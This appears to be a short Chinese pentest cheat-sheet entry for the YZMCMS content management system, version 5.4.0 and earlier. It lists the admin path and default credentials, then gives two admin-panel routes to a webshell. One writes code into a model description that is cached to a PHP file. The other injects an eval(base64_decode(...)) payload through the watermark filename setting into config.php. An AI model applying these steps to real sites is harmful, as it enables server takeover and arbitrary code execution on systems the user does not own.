

# YZMCMS



---

影响版本：5.4.0及以下

后台地址：/news/admin

默认账密：yzmcms/yzmcms

后台get5he11-1：

```
前提：
common/config/config.php
file_config/mode=1 为序列化缓存格式
---
/内容管理/模型管理/编辑模型/模型介绍 写入web5he11
然后访问前台让其生成新的缓存文件
http://域名/cache/chche_file/modelinfo.cache.php
```

后台get5he11-2：

```
/系统管理/系统设置/附加设置/水印图片名称写入：（$1会转义成单引号）
$1,eval(base64_decode($1c3lzdGVtKCdlY2hvIDEyMycpOw==$1)),$1
访问http://域名/common/config/config.php
```

